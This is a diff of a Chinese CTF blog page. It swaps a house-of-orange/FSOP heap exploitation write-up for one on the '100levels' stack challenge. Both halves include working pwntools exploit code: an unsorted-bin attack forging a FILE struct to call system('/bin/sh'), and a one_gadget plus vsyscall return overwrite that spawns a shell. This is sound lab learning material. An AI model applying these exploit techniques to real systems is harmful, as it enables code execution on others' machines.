@@ -8,7 +8,7 @@
 
 <head>
 
-  <title>Rin</title>
+  <title>攻防世界 - 100levels | Rin</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -45,7 +45,10 @@
   
 
   <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"><link rel="stylesheet" href="/assets/css/APlayer.min.css" class="aplayer-style-marker">
+<script src="/assets/js/APlayer.min.js" class="aplayer-script-marker"></script>
+<script src="/assets/js/Meting.min.js" class="meting-script-marker"></script>
+</head>
 
 <!--
 <body class="post-template">
@@ -217,86 +220,48 @@
         <div class="row col-md-offset-2">
             <div class="col-md-8">
     			<span class="post-meta">
-      <time datetime="2022-04-10T09:02:58.445Z" itemprop="datePublished">
-          2022-04-10
+      <time datetime="2022-04-11T12:02:33.312Z" itemprop="datePublished">
+          2022-04-11
       </time>
     
+    
+    | 
+    <a href='/tags/stack/'>stack</a>
+    
+    
 </span>
-                <h1></h1>
+                <h1>攻防世界 - 100levels</h1>
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		<h1><span id="overview">overview</span></h1><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8B%E5%8D%885.05.46.png" alt="截屏2022-04-10 下午5.05.46"></p>
-<h1><span id="逆向">逆向</span></h1><p>​        没有free，只有增查改。</p>
-<p>​        这个题程序逻辑比较简单，主要是利用相对比较复杂。</p>
-<h2><span id="add">add</span></h2><p>​        最多申请三个house。并且在申请house开始为每个house创建了0x10 size的结构体，只有两个字段，size和content ptr。在输入name的阶段会把name读入content ptr指向的地址。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name :&quot;</span>);</span><br><span class="line">read_str((<span class="keyword">void</span> *)chunk_struct_ptr[<span class="number">1</span>], size);</span><br></pre></td></tr></table></figure>
+      		
+    <div id="aplayer-jVmHMTAZ" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
 
-<p>​        接着输入每个橘子的价钱和颜色。颜色不能自己指定，程序提供了一个抽象的菜单以供选择。我们看一下这个菜单。</p>
-<p>​        难绷。</p>
-<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8B%E5%8D%886.03.56.png" alt="截屏2022-04-10 下午6.03.56"></p>
-<p>​        价格被读入一个由<code>calloc()</code>创建的,只有一个size为8的item的chunk中。数量范围被限制在0-7或56746。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">read_str(*((<span class="keyword">void</span> **)chunk_struct_ptr + <span class="number">1</span>), size);</span><br><span class="line">price_chunk = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">8uLL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Price of Orange:&quot;</span>);</span><br><span class="line">*price_chunk = read_num();</span><br><span class="line">color_menu(); </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Color of Orange:&quot;</span>);</span><br><span class="line">color_num = read_num();</span><br><span class="line"><span class="keyword">if</span> ( color_num != <span class="number">56746</span> &amp;&amp; (color_num &lt;= <span class="number">0</span> || color_num &gt; <span class="number">7</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such color&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( color_num == <span class="number">0xDDAA</span> )</span><br><span class="line">  	price_chunk[<span class="number">1</span>] = <span class="number">0xDDAA</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    price_chunk[<span class="number">1</span>] = color_num + <span class="number">30</span>;</span><br><span class="line">*chunk_struct_ptr = price_chunk;</span><br><span class="line">qword_203068 = chunk_struct_ptr;</span><br><span class="line">++idx;</span><br></pre></td></tr></table></figure>
+<h2><span id="overview">overview</span></h2><p>partial relro，没有canary，栈溢出。</p>
+<h3><span id="逆向">逆向</span></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( unk_20208C )</span><br><span class="line">  <span class="built_in">sprintf</span>(v1, <span class="string">&quot;Hint: %p\n&quot;</span>, &amp;system);</span><br></pre></td></tr></table></figure>
 
-<p>​        </p>
-<p>​        </p>
-<p>​        当颜色为56746时，将对应price chunk的第二个字段覆盖为0xddaa。然后就直接把price_chunk的指针保存到<code>chunk_struct_ptr</code>的开头。接着把<code>chunk_struct_ptr</code>保存到bss段上。</p>
-<p>​        另外全程也没有看到和idx有关的指针操作，估计也是只能控制一个house。</p>
-<p>​        </p>
-<h2><span id="show">show</span></h2><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8B%E5%8D%888.26.14.png" alt="截屏2022-04-10 下午8.26.14"></p>
-<p>​        不得不说这个活整得真得很，，可爱。</p>
-<p>​        也就是，输入56746会获得橙色的橘子。</p>
-<p>​        所以两个show的逻辑基本一致，就是show出house的名字和价格，颜色就纯纯整活。</p>
-<h2><span id="edit">edit</span></h2><p>​        有很明显的堆溢出漏洞。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">  read_str((<span class="keyword">void</span> *)buf[<span class="number">1</span>], num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Price of Orange: &quot;</span>);</span><br><span class="line">  v1 = (_DWORD *)*buf;</span><br><span class="line">  *v1 = read_num();</span><br></pre></td></tr></table></figure>
+<p>​        如果能在这个变量上写东西，就能leak。那就不是ret2libc了。并且开了pie，也不好rop。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">4</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x1F</span>uLL) &gt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)buf, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p>​        有栈溢出。</p>
+<p>​        算数游戏内也有</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Question: %d * %d = ? Answer:&quot;</span>, v6, v5);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br></pre></td></tr></table></figure>
 
-
-<p>ps：写菜单的时候不要看错了，这个“Name：”的冒号前面没有空格，蚌埠住了。</p>
-<h1><span id="利用">利用</span></h1><h2><span id="整体思路">整体思路</span></h2><p>​        这道题是经典题了，堆上的话肯定就是利用堆溢出修改top chunk size，以获得unsorted bin。但是后面的利用我就不会了，因为没有做过io_file的题。所以我自己做的话就做到获得unsorted bin为止了。</p>
-<h2><span id="修改top-chunk-size">修改top chunk size</span></h2><p>随便覆盖一些，果然能把top chunk size覆盖，因此我们可以计算需要覆盖的值。</p>
-<p>我这里的堆地址比较畸形，就是都是7f开头的，不过目前不影响，之前的top chunk size为0x20f91，地址是070，加起来正好是0x1000，所以我们只需要覆盖为f91就能实现页对齐。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xf91</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
-
-<h2><span id="获得unsorted-binleak-libc">获得unsorted bin，leak libc</span></h2><p>​        然后直接申请一个0x1000大小的chunk，让堆以brk的形式拓展，就获得了0xf91大小的unsorted bin。</p>
-<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8B%E5%8D%8810.02.34.png" alt="截屏2022-04-10 下午10.02.34"></p>
-<p>​        接着我们还需要leak libc和heap，这里我们可以直接申请一个比较大的范围为large chunk的name，使其能够同时leak libc地址和heap基址。能够同时leak当然是因为large chunk的<code>fd_nextsize</code>与<code>bk_nextsize</code>字段。</p>
-<p>​        <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-11%20%E4%B8%8B%E5%8D%883.07.41.png" alt="截屏2022-04-11 下午3.07.41"></p>
-<p>​        当然如果只是申请small chunk大小的话就只能leak libc，heap需要另外leak。不过接收的话还是要分别来。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">malloc_hook = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;malloc_hook =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(malloc_hook)))</span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x400</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;b&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">0x8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0xd0</span></span><br><span class="line">log.success(<span class="string">&quot;heap_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_addr)))</span><br></pre></td></tr></table></figure>
-
-<p>​        </p>
-<p>​        接下来就是io_file的利用了。</p>
-<h2><span id="fsop">FSOP</span></h2><p>​        由于之前从来咩有做过io_file，所以为了好归纳我就还是再开一篇笔记来专门做io_file的学习笔记吧。等把fsop看完了再来把这个当做例题看。</p>
-<p>​        看完了fsop，回来做题了。</p>
-<p>​        有一个比较奇怪的点，就是这道题我没有猜错的话最早的libc版本应该是libc-2.23.so，但是攻防世界提供的版本是2.19，虽然从io_file利用的角度来看两者其实区别挺大的吗，但是由于这个题目本身的限制非常之多，以至于两个版本实则没有什么大致的区别，并且因为攻防世界的libc没有调试符号，所以我索性就用2.23来做了。</p>
-<p>​        在之前的步骤里我们获得了一个unsortedbin，这也是为什么说这道题的限制非常多，因为我们可以利用的也就只有这一个bin了，所以一般的堆利用方法几乎都失效了。</p>
-<p>​        但是好巧不巧，我们就是能通过这一个bin来实现对于<code>io_list_all</code>的劫持。</p>
-<p>​        但是在考虑这道题情况下的fsop前，我们需要先复习一下普通情况下的fsop，搞清楚几个链表节点以及结构体之间的关系。</p>
-<p>​        实际上我们只需要劫持<code>io_list_all</code>，并把它指向我们伪造的结构体。fake struct需要绕过一些比较简单的检测，然后在结构体内部的字段伪造vtable，并将vtable指向的地方修改为我们想要的函数地址。</p>
-<h3><span id="劫持io_list_all">劫持io_list_all</span></h3><p>​        首先我们需要劫持<code>io_list_all</code>，使它指向我们可以控制的内存区域。</p>
-<p>​        这里会用到<code>unsorted bin attack</code>。将unsorted bin chunk的bk指向<code>_IO_list_all - 0x10</code>，那么就能通过 <code>bck-&gt;fd = unsorted_chunks (av);</code>使<code>io_list_all</code>指向<code>&amp;main_arena+88</code>        。<code>_IO_list_all</code>是位于libc中的全局变量，所以它的地址可以直接通过leak得到。</p>
-<p>​        然后需要伪造结构体，这里面的逻辑比较抽象，大部分原因是我对于这种large bin或者smallbin以及一些结构，还有堆上chunk分配流程的不熟悉，但是我也只能象征性地去理解了。</p>
-<p>​        最后看一眼伪造前的heap</p>
-<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-11%20%E4%B8%8B%E5%8D%884.31.34.png" alt="截屏2022-04-11 下午4.31.34"></p>
-<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-11%20%E4%B8%8B%E5%8D%884.33.06.png" alt="截屏2022-04-11 下午4.33.06">        </p>
-<h3><span id="伪造结构体">伪造结构体</span></h3><p>​            对于unsorted bin的bk指针，我们直接覆盖为<code>_IO_list_all_addr - 0x10</code>。</p>
-<p>​        按照前面的分析，当我们将unsorted bin取出的时候，就会触发<code>bck-&gt;fd =unsortedbin(av)</code>操作。所以还是回到之前非常抽象的利用方式上，unsorted bin的取出环节实际是通过调用<code>_IO_flush_all_lockp</code>实现的，我们退出程序时，程序会自动调用这个函数，此时我们的<code>_IO_list_all_addr </code>就被指向<code>&amp;main_arena + 88</code>，也就是此时已经成功地将<code>io_list_all</code>劫持，我们只需要在<code>&amp;main_arena + 88</code>指向的地址中构造fake struct就行。</p>
-<p>​        虽然但是，程序并没有给我们机会让我们在&amp;main_arena + 88所指向的地方伪造chunk。</p>
-<p>​        <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-11%20%E4%B8%8B%E5%8D%885.09.35.png" alt="截屏2022-04-11 下午5.09.35"></p>
-<p>​        所以我们选择利用下一个节点，这个节点在结构体中的偏移为0x68，也就是<code>&amp;main_arena + 88 + 0x68</code>，正好也是smallbin[6]的位置，所以我们希望能够伪造这个small chunk作为fake struct。</p>
-<p>​        当unsortedbin size为0x60，当unsortedbin被取出，正好就会被放到这个0x60（？？？？？？？？）大小的small chunk中，我们所覆盖的fake struct也就生效了。</p>
-<p>​        我只想问一个问题，为什么会有0x60的small chunk？</p>
-<p>​        先用垃圾数据把原本的chunk填充。然后为了伪造fake chunk，首先要把上一个chunk的price结构体还原。    </p>
-<p>​        然后溢出unsortedbin，这里被溢出的chunk就是之前利用house of orange从top chunk获得的unsortedbin chunk。将chunk的size改为0x61。</p>
-<p>​        接着填充bk，劫持指针。然后就是具体的fake struct的内容，首先需要绕过检测，具体可以看FSOP原理。</p>
-<p>​        然后在fake struct填上vtable的地址，这里是heap+0x510。这个偏移的计算就是此时vtable相对于heap base的偏移加上0x20。也就是这个填入system的地址就是vtable addr指向的地方。</p>
-<p>​        我佛慈悲。        </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x400</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x1f00000000</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x61</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(_IO_list_all_addr - <span class="number">0x10</span>)<span class="comment">#modify bk to  _IO_list_all_addr - 0x10 </span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>) </span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#_mode&lt;=0</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(vtable_addr)<span class="comment">#a pointer</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span> </span><br><span class="line">payload += p64(system_addr)<span class="comment">#vtable + offset</span></span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
-
-
-
-
+<h3><span id="我的疑思">我的疑思</span></h3><p>​        套板子不太行，还是需要想个办法把system打印出来，然后直接用system来rop。</p>
+<p>​        但是说实话，没有思路。这个bss上的全局变量没有任何与程序上的关联，也不太可能通过输入什么东西溢出到那，唯一的可能就是构造任意地址写。</p>
+<p>​        但是我们能够利用的只有一个没办法进行rop的程序执行流跳转，不leak基址都是白搭。所以虽然程序给了partial relro，但是在leak前修改got的可能性非常小，而改got还是得需要地址。</p>
+<p>​        难绷，去看了wp，发现这得看汇编才能找到突破点。</p>
+<h3><span id="利用">利用</span></h3><p>​            ![截屏2022-04-11 下午9.35.53](/Users/rin/Library/Application Support/typora-user-images/截屏2022-04-11 下午9.35.53.png)</p>
+<p>​        这个题的突破点就在于，不管这个全局变量是不是有值，在调用hint函数后system都会被加载在hint栈帧的rbp+0x110处。并且，如果我们开始游戏的输入level环节输入了小于0的数，那么这个变量将不会被初始化，</p>
+<p>​        <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-11%20%E4%B8%8B%E5%8D%8810.06.55.png" alt="截屏2022-04-11 下午10.06.55"></p>
+<p>​        也就是如果在输入v4的时候输入0，v4就还是system的地址，在第二次输入的时候输入system与<code>one_gadget</code>的偏移，就能使v5变为<code>one_gadget</code>的地址。这样我们就获得了一个栈上的可以利用的地址。</p>
+<p>​        但是如何ret到这个地址呢？</p>
+<p>​        观察栈帧，可以发现，当我们选择在play函数中溢出，play函数上一个函数栈帧，也就是run函数的物理相邻，正好就是run函数的函数局部变量，而system的地址与play的返回地址就只差了24字节。</p>
+<p>​        如果是一般的栈题我们可以直接用ret或者pop调栈，但是由于pie我们无法进行普通的rop，但是可以利用到vsyscall做到相似的结果。</p>
+<p>​        vsyscall并不受pie影响，始终在<code>0xffffffffff600000-0xffffffffff601000</code>区域内，所以我们可以在返回地址连续填写三次vsyscall，获得类似ret的效果。</p>
+<p>​        但是需要注意的是因为之前level被改成了地址，所以是大于100的，于是需要先写脚本进行99次游戏，才能在最后一次的时候覆盖返回地址。</p>
+<p>​        exp直接copy了，我这里应该调不动。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./100levels&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./100levels&quot;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0x45216</span></span><br><span class="line">sys_addr = <span class="number">0x45390</span></span><br><span class="line">offset = one_gadget - sys_addr</span><br><span class="line">vsys_addr = <span class="number">0xffffffffff600007</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">play</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Question: &#x27;</span>)</span><br><span class="line">    a = p.recvuntil(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    a = a[:-<span class="number">1</span>]</span><br><span class="line">    a = <span class="built_in">int</span>(a, <span class="number">10</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;* &#x27;</span>)</span><br><span class="line">    b = p.recvuntil(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    b = b[:-<span class="number">1</span>]</span><br><span class="line">    b = <span class="built_in">int</span>(b, <span class="number">10</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Answer:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(a * b))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Choice:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;How many levels?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Any more?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Let&#x27;s go!&#x27;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">	play()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Answer:&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(vsys_addr) * <span class="number">3</span>  </span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
             <div class="clearfix"></div>
@@ -304,13 +269,9 @@
         </div>
         <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
     
-    <a class="pull-left" href="../heap_learning_io_file/" style="float: left;">
-        ← IO_FILE学习
-    </a>
     
-    
-    <a class="pull-right" href="../heap_learning_house_of_orange/">
-        house_of_orange trick学习 →
+    <a class="pull-right" href="../../10/heap_learning_io_file/">
+        IO_FILE学习 →
     </a>
     
 </nav>
